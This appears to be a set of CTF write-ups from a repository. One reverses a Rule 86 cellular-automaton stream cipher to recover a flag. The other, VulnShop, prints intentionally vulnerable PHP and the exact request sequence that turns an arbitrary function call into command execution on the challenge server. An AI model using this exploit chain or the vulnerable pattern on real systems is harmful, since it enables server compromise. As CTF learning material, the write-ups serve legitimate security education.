Since we know that `ciphertext = keystream ^ message`, and we know a `ciphertext` and `message` pair (`rule86.txt` and `rule86.txt.enc`), we can calculate part of the keystream by calculating `keystream = ciphertext ^ message`.

One we know part of the keystream, we can decrypt other ciphertexts by just xoring them with the keystream.

# Partial decryption

At this point, we can only decrypt as many bytes of a ciphertext as we have bytes of the keystream (aka the size of `rule86.txt`). Because of this, we can't fully decrypt any of the other files, as they're all too large.

As a start, we decrypted the `super_cipher.py.enc` file to see some of the code that was used for the cipher.

Here is the partially decrypted code:
```python
#!/usr/bin/env python3

import argparse
import sys

parser = argparse.ArgumentParser()
parser.add_argument("key")
args = parser.parse_args()

RULE = [86 >> i & 1 for i in range(8)]
N_BYTES = 32
N = 8 * N_BYTES

def next(x):
  x = (x & 1) << N+1 | x << 1 | x >> N-1
  y = 0
  for i in range(N):
    y |= RULE[(x >> i) & 7] << i
  return y

# Bootstrap the PNRG
keystream = int.from_bytes(args.key.encode(),'little')
for i in range(N//2):
  keystream = next(keystream)

# Encrypt / decrypt stdin to stdout
plainte
```

From this code, we know how how the keystream is generated (just repeatedly calling `next` on the previous keystream block), and can thus generate a keystream of whatever length we want using the partial keystream that we recovered:

```python

#read the sample data given to us
txt = open("./sample_files/rule86.txt", "rb").read()
enc = open("./sample_files/rule86.txt.enc", "rb").read()
hint = open("./sample_files/hint.gif.enc", "rb").read()
py_file = open("./sample_files/super_cipher.py.enc", "rb").read()

#xors two byte arrays
def xor(bytes1, bytes2):
    return bytearray([(a ^ b) for (a, b) in zip(bytes1, bytes2)])

#gets the first N_BYTES of the keystream that was used to encrypt rule86.txt.enc
def get_base_keystream():
    return xor(txt, enc)[0:N_BYTES]

#gets the base keystream that was used, and generates the whole `length` byte keystream that can be used to decrypt
def generate_stream(length):
    keystream = get_base_keystream()
    curr_int = int.from_bytes(keystream, 'little')
    for i in range(ceil(length/N_BYTES) - 1):
        curr_int = next(curr_int)
        keystream += curr_int.to_bytes(N_BYTES, 'little')
    return keystream

#decrypts an array of bytes
def decrypt(input_bytes):
    length = len(input_bytes)
    keystream = generate_stream(length)
    return xor(input_bytes, keystream)

```

Using this, we were able to fully decrypt each of the encrypted files.

# Now we're done right?

At this point, we looked at the decrypted files, and were disappointed to find that the `hint.gif` did not contain the flag (and super_cipher.py didn't contain any more useful info):

![decrypted hint](images/hint.gif)

From the hint, we could see that the key that was input to bootstrap the "prg" is a flag for the challenge, and so we need to reverse the prg, and walk our way back through the keystream to get what the input key was.

# Reversing the "prg"

From the decrypted code, we could see that the `next` function does the following:

* Takes in a 256 bit input x
* Computes a 257 bit x' such that the first bit of x' is the 256th bit of x, the 257th bit of x' is the 1st bit of x and the remaining 255 bits of x' are x' left shifted by 1.
* Computes a value y, where each bit of y is determined by looking up 3 bits of x' in a table of 0's and 1's.

So in order to reverse this, we did the following:
* For the first bit of a 256 bit input y, determine what possible 3-bit codes of x' could have resulted in that bit of y and store them as possible decodings of y.
* Walk through y one bit at a time, and update the potential values of x' that could have resulted in what we've seen so far in y.
* At the end, look at all of our possibilities for x' and check that they match the following conditions:
	* The 257th bit of x' == the 2nd to last bit of x' (both were set to be the first bit of x in `next`)
	* The 256th bit of x' == the last bit of x' (both were set to be the 256th bit of x in `next`)
* After recovering the 1 valid possibility for x', undo the bit shifts that were done in `next` to recover the original x.

Here's the code that was written to solve this:
```python
#given in super_cipher.py
RULE = [(86 >> i) & 1 for i in range(8)]
N_BYTES = 32
N = 8 * N_BYTES

# in y = next(x), each 3 bits of x determines 1 bit of y
# use this dictionary to store this relation for reversing this function
dct = {
    #y      x
    "0" : ["000", "011", "101", "111"],
    "1" : ["001", "010", "100", "110"]
}

#takes in an int value of keystream, reverses the "prg" to get the value that came before it
def prev(y):
    #turn to bit string of 256 bits
    y = "{0:b}".format(y)
    y = y.zfill(N)

    #the last bit can be decoded as any of the 4 values of x that could have set that bit
    possibilities = dct[y[-1]]
    #loop in reverse to get all possible values of x that could have created this y
    for bit in reversed(y[:-1]):
        new_possibilities = []
        candidates = dct[bit]
        for candidate in candidates:
            for possibility in possibilities:
                #if the last 2 bits of the candidate match the first two bits of an existing possibility,
                #we can just append the first bit of the candidate to the possibility
                if candidate[1:] == possibility[:2]:
                    new_possibilities += [candidate[0] + possibility]
        possibilities = new_possibilities

    #Do some more checks to see which possibilities are actually valid
    real = []
    for possibility in possibilities:
        #the `next` function takes an input x, and turns it into x' such that the last bit of x' = the first bit of x, and the first bit of x' = the last bit of x
        #so check that the values of possibility are valid x' values in this way.
        if possibility[0] == possibility[-2]:
            if possibility[1] == possibility[-1]:
                real += [possibility]
    if len(real) != 1:
        print("there was an issue :(")
        print(len(real))
        sys.exit();

    #convert back to an int
    x = int(real[0], 2)

    #reverse the bit operations done in `next` 
    #(move the first bit to be the N'th bit, shift the rest of the value to the right by 1)
    x = ((x >> 1) & ((2**N) - 1)) | ((x & 1) << (N - 1))
    return x

```

Once we could reverse the `next` function, we took the first keystream block used to encrypt, and reversed the bootstrapping loop to get back the original key:

```python
#we can get part of the key stream by just Xoring together a plaintext and a ciphertext
# C = (M ^ K), so C ^ M = K, which lets us recover the keystream.
partial_keystream = xor(txt, enc)

#the first value of `keystream` used to encrypt the ciphertexts we've been given (the first 256 bits of the partial keystream)
base_key = int.from_bytes(partial_keystream[0:N_BYTES], 'little')

#use prev to reverse the key stream generation to get the original key
curr = base_key
for i in range(N//2):
    curr = prev(curr)
print(curr.to_bytes(N_BYTES, 'little'))

```

And this outputs the key/flag:
![description](images/flag.png)

`INS{Rule86_is_W0lfr4m_Cha0s}`

The full solution code can be found here: [Link](./sol.py)



### File: CTF-Writeups/2018/Insomni'hack teaser/VulnShop/README.md

![description](images/description.png)

# Getting Started:

We're given a link to the VulnShop webpage, which contains links to the source code of the page, as well as php configuration details about the server.

![index page](images/index.png)

Here is the given source code:
```php
<?php if(isset($_GET['hl'])){ highlight_file(__FILE__); exit; } 
    error_reporting(0); session_start();  
    // Anti XSS filter 
    $_REQUEST = array_map("strip_tags", $_REQUEST); 
    // For later, when we will store infos about visitors. 
    chdir("tmp"); 
?> 
<!DOCTYPE html> 
<html> 
    <head> 
        <title>Work in progress...</title> 
        <meta charset="utf-8" /> 
        <meta http-equiv="content-type" content="text/html; charset=utf-8" /> 
        <style> 
            body { 
                background-color: #aaa; 
                color:#fff; 
            } 
             
            .page { 
                width: 50%; 
                margin: 0 auto; 
                margin-top: 75px; 
            } 
             
             
            .menu ul li { 
                display:inline-block; 
                vertical-align:top; 
                margin-right: 30px; 
                 
            } 
        </style> 
    </head> 
    <body> 
        <div class="page"> 
            <div class="menu"> 
                <ul> 
                    <li><a href="?page=default">Home</a></li> 
                    <li><a href="?page=introduction">Introduction</a></li> 
                    <li><a href="?page=privacy">Privacy</a></li> 
                    <li><a href="?page=contactus">Contact</a></li> 
                </ul> 
            </div> 
             
            <div class="content"> 
                <?php 
                        switch($_GET['page']) { 
                            case 'default': 
                            default: 
                                echo "<p>Welcome to our website about infosec. It's still under construction, but you can begin to browse some pages!</p>"; 
                                break; 
                            case 'introduction': 
                                echo "<p>Our website will introduce some new vulnerabilities. Let's check it out later!</p>"; 
                                break; 
                            case 'privacy': 
                                echo "<p>This website is unbreakable, so don't worry when contacting us about some new vulnerabilities!</p>"; 
                                break; 
                            case 'contactus': 
                                echo "<p>You can't contact us for the moment, but it will be available later.</p>"; 
                                $_SESSION['challenge'] = rand(100000,999999); 
                                break; 
                            case 'captcha': 
                                if(isset($_SESSION['challenge'])) echo $_SESSION['challenge']; 
                                // Will make an image later 
                touch($_SESSION['challenge']); 
                                break; 
                            case 'captcha-verify': 
                // verification functions take a file for later, when we'll provide more way of verification 
                                function verifyFromString($file, $response) { 
                                    if($_SESSION['challenge'] === $response) return true; 
                                    else return false; 
                                } 
                                 
                                // Captcha from math op 
                                function verifyFromMath($file, $response) { 
                                    if(eval("return ".$_SESSION['challenge']." ;") === $response) return true; 
                                    else return false; 
                                } 
                                if(isset($_REQUEST['answer']) && isset($_REQUEST['method']) && function_exists($_REQUEST['method'])){ 
                                    $_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']); 
                                } 
                                break; 

                        } 
                ?> 
            </div> 
        </div> 
        <p><a href="/?hl">View code source of the file, to be sure we're secure!</a></p> 
        <p><a href="/phpinfo.php">Show our configurations</a></p> 
    </body> 
</html> 
```

From this code, we see that the server will generate a new random number and set our `challenge` variable every time we navigate to `/contactus`. This challenge is also stored as a file, and is used in later requests to `/captcha` and `/captcha-verify`.

In the handler for `/captcha-verify`, there's a line that allows us to call arbitrary functions, with the random number filename as the first parameter, and our input as the second parameter.
From this, it seems like a good way to solve the challenge would be to try to write some code to the file using this vulnerable function, use it again to execute the code that we wrote, and then use it again to read the output of our code.

# The Exploit:

Here is the script we will execute on the server (this appends the contents of `/flag` to the end of the currently running script):
```bash
#!/bin/sh
cat /flag >> "./${0##*/}";
```

We can only use functions that follow the format: `func(filename, input)`, where we can't control the filename (since it's randomly generated, and we can't edit it), but can control the input.

We also cannot use any of the functions listed in the `disable_functions` section of the server config (ie, most of the functions that would allow us to execute the code). Luckily, the server still allows us to use popen to execute files.

![disabled functions](images/disabled.png)

## Actual commands used:
We write the script to the file with file_put_contents(filename, our_script).

We then use chmod(filename, "511") to make it executable. PHP casts our string input to a decimal integer, and decimal 511 = octal 0777, which gives read/write/execute permissions to everyone on the server.

We run the new file with popen(filename, "r")

We read the output with highlight_file(filename, "")

Here are the actual requests made to exploit the server:

## Get a randomly generated challenge:
`http://vulnshop.teaser.insomnihack.ch/?page=contactus`

## Write the script to the file:
`http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=file_put_contents&answer=%23!%2Fbin%2Fsh%0Acat%20%2Fflag%20%3E%3E%20%22.%2F%24%7B0%23%23*%2F%7D%22%3B`

## Turn it executable:
`http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=chmod&answer=511`

## Run the script:
`http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=popen&answer=r`

## Read the output (which is now appended to the end of the script we wrote):
`http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=highlight_file&answer=`

![output of the exploit](images/output.png)

And now we get the flag: `INS{4rb1tr4ry_func_c4ll_is_n0t_s0_fun}`




### File: CTF-Writeups/README.md

# CTF-Writeups

This repo contains writeups for some challenges that I've solved in CTFs.

If you want to see writeups by other members of 0xBU, check out https://0xbu.com/writeups/

